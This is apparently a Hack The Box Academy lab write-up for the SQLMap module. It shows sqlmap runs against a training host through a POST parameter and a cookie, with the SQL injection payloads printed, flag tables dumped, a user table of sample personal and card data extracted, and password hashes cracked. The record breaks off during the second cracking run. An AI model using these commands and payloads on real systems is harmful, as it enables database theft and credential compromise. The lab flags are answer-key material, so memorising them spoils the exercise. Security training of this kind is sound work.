# Section 04: Running SQLMap on an HTTP Request

Module: 18. SQLMap Essentials

---

## Questions & Answers

### 1. What's the contents of table flag2? (Case #2)

Context:
- Capture the request and get the HTTP request
```bash
POST /case2.php HTTP/1.1
Host: 154.57.164.82:30883
Content-Length: 5
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://154.57.164.82:30883
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://154.57.164.82:30883/case2.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

id=12
```
- Exploit with SQLMap:
```bash
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-jly8u2dih3-htb-cloud-com]─[~]
└──╼ [★]$ vim req.txt
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-jly8u2dih3-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -r req.txt --dump --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:32:12 /2026-09-08/

[21:32:12] [INFO] parsing HTTP request from 'req.txt'
[21:32:12] [INFO] testing connection to the target URL
[21:32:12] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:32:12] [INFO] testing if the target URL content is stable
[21:32:12] [INFO] target URL content is stable
[21:32:12] [INFO] testing if POST parameter 'id' is dynamic
[21:32:13] [INFO] POST parameter 'id' appears to be dynamic
[21:32:13] [INFO] heuristic (basic) test shows that POST parameter 'id' might be injectable (possible DBMS: 'MySQL')
[21:32:13] [INFO] heuristic (XSS) test shows that POST parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[21:32:13] [INFO] testing for SQL injection on POST parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[21:32:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:32:13] [WARNING] reflective value(s) found and filtering out
[21:32:14] [INFO] POST parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="19")
[21:32:14] [INFO] testing 'Generic inline queries'
[21:32:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[21:32:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:32:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[21:32:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[21:32:15] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[21:32:16] [WARNING] potential permission problems detected ('command denied')
[21:32:16] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[21:32:16] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[21:32:16] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[21:32:16] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:32:17] [INFO] POST parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[21:32:17] [INFO] testing 'MySQL inline queries'
[21:32:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[21:32:17] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)
[21:32:30] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[21:32:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:32:41] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[21:32:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:32:41] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:32:41] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:32:42] [INFO] target URL appears to have 9 columns in query
[21:32:43] [INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=12 AND 4713=4713

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=12 AND (SELECT 9972 FROM(SELECT COUNT(*),CONCAT(0x7176627671,(SELECT (ELT(9972=9972,1))),0x716b6b7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=12;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=12 AND (SELECT 2470 FROM (SELECT(SLEEP(5)))ESNg)

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: id=12 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7176627671,0x777173546841666255554172486e4641734942616f4c6b6d4d5746754d487372436177786e416868,0x716b6b7071),NULL,NULL,NULL,NULL-- -
---
[21:32:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[21:32:43] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[21:32:43] [INFO] fetching current database
[21:32:43] [INFO] fetching tables for database: 'testdb'
[21:32:44] [INFO] fetching columns for table 'flag2' in database 'testdb'
[21:32:44] [INFO] fetching entries for table 'flag2' in database 'testdb'
Database: testdb
Table: flag2
[1 entry]
+----+----------------------------------------+
| id | content                                |
+----+----------------------------------------+
| 1  | HTB{700_much_c0n6r475_0n_p057_r3qu357} |
+----+----------------------------------------+

[21:32:45] [INFO] table 'testdb.flag2' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/flag2.csv'
[21:32:45] [INFO] fetching columns for table 'users' in database 'testdb'
[21:32:45] [INFO] fetching entries for table 'users' in database 'testdb'
[21:32:46] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[21:32:46] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[21:32:46] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[21:32:46] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[21:32:46] [INFO] starting 4 processes 
[21:32:46] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'
[21:32:46] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'
[21:32:46] [INFO] cracked password '1955chev' for hash 'aed6d83bab8d9234a97f18432cd9a85341527297'
[21:32:46] [INFO] cracked password '3052' for hash '9a0f092c8d52eaf3ea423cef8485702ba2b3deb9'
[21:32:46] [INFO] cracked password 'Enizoom1609' for hash 'd642ff0feca378666a8727947482f1a4702deba0'
[21:32:47] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'
[21:32:47] [INFO] cracked password 'actionteam' for hash '520df62660b18e571c7cb3b5d3f559b8a8ff0d4b'
[21:32:47] [INFO] cracked password 'aza221p' for hash '6725c7bee76ccdb7eda15fa263908988115498a9'
[21:32:47] [INFO] cracked password 'breakout' for hash 'ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74'
[21:32:47] [INFO] cracked password 'donatus' for hash '20021ffbd3be7a3cddc64812d5dd6e5afb6e760c'
[21:32:47] [INFO] cracked password 'exquisite' for hash 'c7fbcdaf308cdcd64504d46342e7c79959388c44'
[21:32:48] [INFO] cracked password 'hibiskus' for hash 'a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295'
[21:32:48] [INFO] cracked password 'hjungpil1' for hash '4282cfe7697817374251bc17aa47de6f620586b5'
[21:32:48] [INFO] cracked password 'homerhound' for hash 'c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b'
[21:32:48] [INFO] cracked password 'ford1900' for hash 'f2d897eb3bae0f1fd396325deb3c4779ae1d586d'
[21:32:48] [INFO] cracked password 'mike230040' for hash '65b136cb1ec4b88f709f8f510262720eddfa71a7'
[21:32:48] [INFO] cracked password 'millisa34' for hash '608e6d07cc8ce20bfdaf9c72ef420ad691de32cb'
[21:32:48] [INFO] cracked password 'morswin2' for hash '8203b1bf12aba49d7566ff7007b60d1c0a439bee'
[21:32:48] [INFO] cracked password 'nike92' for hash '2e0488a09433aa0d67b3463c76f407c7b0388ad7'
[21:32:48] [INFO] cracked password 'melek200215' for hash '5635e59941510dc473fbeed046c43007f76cfe03'
[21:32:48] [INFO] cracked password 'plasid' for hash '15ce1871a907e8265f00defa21a723e7a4d35267'
[21:32:48] [INFO] cracked password 'raided' for hash '2b89b43b038182f67a8b960611d73e839002fbd9'
[21:32:48] [INFO] cracked password 'rohaniah' for hash '4bf1926f7bb7ae283e1390236fd4a8737209862e'
[21:32:48] [INFO] cracked password 'sk8ter58' for hash '3d8f48ab8e119dd813a449f6bfcf42abae63567b'
[21:32:49] [INFO] cracked password 'tarablinda' for hash '9987f0c165bc62eb3ee3db17967fbb81c026c197'
[21:32:49] [INFO] cracked password 'sgreen4eva' for hash '41244ab550c182b3ebe2dce87065bf363d0e013e'
[21:32:49] [INFO] cracked password 'spiderpig8574376' for hash 'b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e'
[21:32:49] [INFO] cracked password 'ssival47' for hash 'f5eb0fbdd88524f45c7c67d240a191163a27184b'
[21:32:49] [INFO] cracked password 'vptwo0gc' for hash '21549a28300f72442b132d06d4016de606f36627'
Database: testdb                                                               
Table: users
[32 entries]
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| id | cc               | email                       | phone        | name              | address                | birthday          | password                                                    | occupation                                        |
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| 1  | 5387278172507117 | MaynardMRice@yahoo.com      | 281-559-0172 | Maynard Rice      | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |
| 2  | 4539475107874477 | JulioWThomas@gmail.com      | 973-426-5961 | Julio Thomas      | 1207 Granville Lane    | February 14 1972  | 10946aa229a6d569f226976b22ea0e900a1fc219                    | Agricultural product sorter                       |
| 3  | 4716522746974567 | KennethTMaloney@gmail.com   | 954-617-0424 | Kenneth Maloney   | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | General and operations manager                    |
| 4  | 4929811432072262 | GregoryBStumbaugh@yahoo.com | 410-680-5653 | Gregory Stumbaugh | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |
| 5  | 4539646911423277 | BobbyJGranger@gmail.com     | 212-696-1812 | Bobby Granger     | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |
| 6  | 5143241665092174 | KimberlyMWright@gmail.com   | 440-232-3739 | Kimberly Wright   | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |
| 7  | 5503989023993848 | DeanLHarper@yahoo.com       | 440-847-8376 | Dean Harper       | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |
| 8  | 4556586478396094 | GabrielaRWaite@msn.com      | 732-638-1529 | Gabriela Waite    | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         | Telephone station installer                       |
| 9  | 5452466713512742 | RoySCarr@msn.com            | 408-848-6272 | Roy Carr          | 1384 Sycamore Street   | October 19 1942   | 9987f0c165bc62eb3ee3db17967fbb81c026c197 (tarablinda)       | Freight, stock, and material mover                |
| 10 | 5231550277906388 | AlfonzoGWilliams@gmail.com  | 740-546-1581 | Alfonzo Williams  | 911 Irving Road        | July 16 1931      | c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b (homerhound)       | Outside order clerk                               |
| 11 | 5224197138746170 | ChristopherHBrown@yahoo.com | 917-840-2535 | Christopher Brown | 2246 Settlers Lane     | March 29 1951     | 608e6d07cc8ce20bfdaf9c72ef420ad691de32cb (millisa34)        | Unlicensed assistive personnel                    |
| 12 | 4485150912665782 | AudreyRHill@gmail.com       | 717-308-3644 | Audrey Hill       | 2306 Stout Street      | July 19 1969      | 8203b1bf12aba49d7566ff7007b60d1c0a439bee (morswin2)         | Mail processor                                    |
| 13 | 4716071391111521 | RyanMSpencer@msn.com        | 256-441-1530 | Ryan Spencer      | 4309 Turnpike Drive    | July 3 1979       | ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74 (breakout)         | Claims representative                             |
| 14 | 4716242999773281 | JessieJSchwan@yahoo.com     | 989-217-2111 | Jessie Schwan     | 1285 Wood Street       | October 28 1937   | 520df62660b18e571c7cb3b5d3f559b8a8ff0d4b (actionteam)       | Network and computer systems administrator        |
| 15 | 5183997232057997 | ShannonRStewart@yahoo.com   | 828-850-2133 | Shannon Stewart   | 1596 Watson Lane       | May 28 1934       | 2e0488a09433aa0d67b3463c76f407c7b0388ad7 (nike92)           | Sketch artist                                     |
| 16 | 4556164708532886 | MarkLStilwell@msn.com       | 715-392-4649 | Mark Stilwell     | 121 Abner Road         | September 1 1950  | 21549a28300f72442b132d06d4016de606f36627 (vptwo0gc)         | Occupational therapist assistant                  |
| 17 | 4485731897297327 | AnnetteDGill@yahoo.com      | 216-376-3062 | Annette Gill      | 4999 Glenwood Avenue   | August 19 1977    | 0ff476c2676a2e5f172fe568110552f2e910c917 (Zc1uowqg6)        | Plate finisher                                    |
| 18 | 4485934311754598 | CyndiBReyes@gmail.com       | 903-679-2061 | Cyndi Reyes       | 4347 Hall Place        | June 5 1947       | 15ce1871a907e8265f00defa21a723e7a4d35267 (plasid)           | Executive                                         |
| 19 | 5217064909950341 | WilliamDMunoz@gmail.com     | 323-789-6686 | William Munoz     | 2961 Hillhaven Drive   | July 4 1928       | df692aa944eb45737f0b3b3ef906f8372a3834e9 (1201Hunt)         | Service station attendant                         |
| 20 | 4929461176669103 | ScottBPonce@yahoo.com       | 626-537-0602 | Scott Ponce       | 3023 Woodstock Drive   | September 19 1947 | 20021ffbd3be7a3cddc64812d5dd6e5afb6e760c (donatus)          | Benefits manager                                  |
| 21 | 4916977560623393 | PhilipTAhearn@gmail.com     | 509-327-6685 | Philip Ahearn     | 4418 Goodwin Avenue    | May 22 1938       | 3d8f48ab8e119dd813a449f6bfcf42abae63567b (sk8ter58)         | Office assistant                                  |
| 22 | 5480619405065199 | MyraJStephenson@yahoo.com   | 717-770-6897 | Myra Stephenson   | 4225 Aaron Smith Drive | December 25 1966  | 41244ab550c182b3ebe2dce87065bf363d0e013e (sgreen4eva)       | Animator                                          |
| 23 | 4532761682899246 | MarianCJoiner@yahoo.com     | 707-467-5061 | Marian Joiner     | 273 Fairway Drive      | February 12 1978  | 5635e59941510dc473fbeed046c43007f76cfe03 (melek200215)      | Foundry mold and coremaker                        |
| 24 | 5357620822740711 | LloydSLiu@gmail.com         | 616-396-4287 | Lloyd Liu         | 3277 Howard Street     | August 18 1951    | 09422b94c8f031285b22500c2d0a68bb8ec4dc70                    | Sound engineering technician                      |
| 25 | 5219707450752213 | JoshuaEFletcher@gmail.com   | 317-670-8864 | Joshua Fletcher   | 1510 Stewart Street    | August 14 1934    | 65b136cb1ec4b88f709f8f510262720eddfa71a7 (mike230040)       | Edition binding worker                            |
| 26 | 4485684355495794 | MargaretNBooker@msn.com     | 760-969-7147 | Margaret Booker   | 70 Wilson Street       | December 17 1975  | 4282cfe7697817374251bc17aa47de6f620586b5 (hjungpil1)        | Management information systems director           |
| 27 | 5134210174158363 | FrancisMArroyo@yahoo.com    | 951-252-9692 | Francis Arroyo    | 3600 Hillcrest Lane    | July 6 1993       | f2d897eb3bae0f1fd396325deb3c4779ae1d586d (ford1900)         | Gastroenterology nurse                            |
| 28 | 4485114901308234 | AngelJMarquez@gmail.com     | 209-874-4743 | Angel Marquez     | 1144 Richards Avenue   | May 14 1966       | 4bf1926f7bb7ae283e1390236fd4a8737209862e (rohaniah)         | Echocardiographer                                 |
| 29 | 4532210842993911 | PamelaJRock@yahoo.com       | 715-454-8565 | Pamela Rock       | 3110 Abner Road        | October 31 1992   | c7fbcdaf308cdcd64504d46342e7c79959388c44 (exquisite)        | Private investigator                              |
| 30 | 4556109704569770 | DennisDSnow@yahoo.com       | 715-730-1951 | Dennis Snow       | 4211 Tea Berry Lane    | November 10 1938  | 6725c7bee76ccdb7eda15fa263908988115498a9 (aza221p)          | Unlicensed assistive personnel                    |
| 31 | 5554945940459873 | LorenSBunch@gmail.com       | 805-766-2963 | Loren Bunch       | 3111 Par Drive         | October 22 1971   | 70f361f8a1c9035a1d972a209ec5e8b726d1055e (05adrian)         | Cafeteria cook                                    |
| 32 | 4716522746974567 | KennethTMaloney@gmail.com   | 954-617-0424 | Kenneth Maloney   | 2811 Kenwood Place     | May 14 1989       | c6970ba1130b4bbca5be99f0ce00a706f256c818                    | General and operations manager                    |
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+

[21:32:50] [INFO] table 'testdb.users' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/users.csv'
[21:32:50] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[21:32:50] [WARNING] your sqlmap version is outdated

[*] ending @ 21:32:50 /2026-09-08/
```

**Answer:** `HTB{700_much_c0n6r475_0n_p057_r3qu357}`

---

### 2. What's the contents of table flag3? (Case #3)

Context:
- The vulnerable is the cookie `id=<id_number>`, exploit with SQLMap:
```bash
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-jly8u2dih3-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -u "http://154.57.164.82:30883/case3.php" --cookie="id=1*" --batch --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:36:43 /2026-09-08/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[21:36:43] [INFO] testing connection to the target URL
[21:36:43] [INFO] testing if the target URL content is stable
[21:36:43] [INFO] target URL content is stable
[21:36:43] [INFO] testing if (custom) HEADER parameter 'Cookie #1*' is dynamic
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
[21:36:44] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be dynamic
[21:36:44] [INFO] heuristic (basic) test shows that (custom) HEADER parameter 'Cookie #1*' might be injectable (possible DBMS: 'MySQL')
[21:36:44] [INFO] heuristic (XSS) test shows that (custom) HEADER parameter 'Cookie #1*' might be vulnerable to cross-site scripting (XSS) attacks
[21:36:44] [INFO] testing for SQL injection on (custom) HEADER parameter 'Cookie #1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[21:36:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:36:44] [WARNING] reflective value(s) found and filtering out
[21:36:45] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="1958")
[21:36:45] [INFO] testing 'Generic inline queries'
[21:36:45] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[21:36:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:36:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[21:36:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[21:36:46] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[21:36:46] [WARNING] potential permission problems detected ('command denied')
[21:36:46] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[21:36:47] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[21:36:47] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[21:36:47] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:36:47] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[21:36:47] [INFO] testing 'MySQL inline queries'
[21:36:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[21:36:48] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                  
[21:37:01] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[21:37:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:37:12] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[21:37:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:37:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:37:12] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:37:13] [INFO] target URL appears to have 9 columns in query
[21:37:14] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) HEADER parameter 'Cookie #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 4133=4133

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 4183 FROM(SELECT COUNT(*),CONCAT(0x716b787671,(SELECT (ELT(4183=4183,1))),0x716b7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7666 FROM (SELECT(SLEEP(5)))kUnO)

    Type: UNION query
    Title: Generic UNION query (NULL) - 10 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b787671,0x716a477466484d44707a6448544e4b7178555561454c6b4a704644687642544e6a6648614f7a4650,0x716b7a6a71),NULL,NULL,NULL,NULL-- -
---
[21:37:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[21:37:14] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[21:37:14] [INFO] fetching current database
[21:37:14] [INFO] fetching tables for database: 'testdb'
[21:37:15] [INFO] fetching columns for table 'flag3' in database 'testdb'
[21:37:15] [INFO] fetching entries for table 'flag3' in database 'testdb'
Database: testdb
Table: flag3
[1 entry]
+----+------------------------------------------+
| id | content                                  |
+----+------------------------------------------+
| 1  | HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475} |
+----+------------------------------------------+

[21:37:16] [INFO] table 'testdb.flag3' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/flag3.csv'
[21:37:16] [INFO] fetching columns for table 'users' in database 'testdb'
[21:37:16] [INFO] fetching entries for table 'users' in database 'testdb'
[21:37:17] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[21:37:17] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[21:37:17] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[21:37:17] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[21:37:17] [INFO] starting 4 processes 
[21:37:17] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'                                            
[21:37:17] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'                                            
[21:37:17] [INFO] cracked password '1955chev' for hash 'aed6d83bab8d9234a97f18432cd9a85341527297'                                            
[21:37:17] [INFO] cracked password '3052' for hash '9a0f092c8d52eaf3ea423cef8485702ba2b3deb9'                                                
[21:37:17] [INFO] cracked password 'Enizoom1609' for hash 'd642ff0feca378666a8727947482f1a4702deba0'                                         
[21:37:17] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'                                           
[21:37:17] [INFO] cracked password 'actionteam' for hash '520df62660b18e571c7cb3b5d3f559b8a8ff0d4b'                                          
[21:37:17] [INFO] cracked password 'aza221p' for hash '6725c7bee76ccdb7eda15fa263908988115498a9'                                             
[21:37:18] [INFO] cracked password 'breakout' for hash 'ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74'                                            
[21:37:18] [INFO] cracked password 'donatus' for hash '20021ffbd3be7a3cddc64812d5dd6e5afb6e760c'                                             
[21:37:18] [INFO] cracked password 'hjungpil1' for hash '4282cfe7697817374251bc17aa47de6f620586b5'                                           
[21:37:18] [INFO] cracked password 'homerhound' for hash 'c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b'                                          
[21:37:18] [INFO] cracked password 'exquisite' for hash 'c7fbcdaf308cdcd64504d46342e7c79959388c44'                                           
[21:37:18] [INFO] cracked password 'hibiskus' for hash 'a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295'                                            
[21:37:18] [INFO] cracked password 'melek200215' for hash '5635e59941510dc473fbeed046c43007f76cfe03'                                         
[21:37:18] [INFO] cracked password 'millisa34' for hash '608e6d07cc8ce20bfdaf9c72ef420ad691de32cb'                                           
[21:37:18] [INFO] cracked password 'morswin2' for hash '8203b1bf12aba49d7566ff7007b60d1c0a439bee'                                            
[21:37:19] [INFO] cracked password 'ford1900' for hash 'f2d897eb3bae0f1fd396325deb3c4779ae1d586d'                                            
[21:37:19] [INFO] cracked password 'plasid' for hash '15ce1871a907e8265f00defa21a723e7a4d35267'                                              
[21:37:19] [INFO] cracked password 'mike230040' for hash '65b136cb1ec4b88f709f8f510262720eddfa71a7'                                          
[21:37:19] [INFO] cracked password 'raided' for hash '2b89b43b038182f67a8b960611d73e839002fbd9'                                              
[21:37:19] [INFO] cracked password 'sgreen4eva' for hash '41244ab550c182b3ebe2dce87065bf363d0e013e'                                          
[21:37:19] [INFO] cracked password 'nike92' for hash '2e0488a09433aa0d67b3463c76f407c7b0388ad7'                                              
[21:37:19] [INFO] cracked password 'spiderpig8574376' for hash 'b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e'                                    
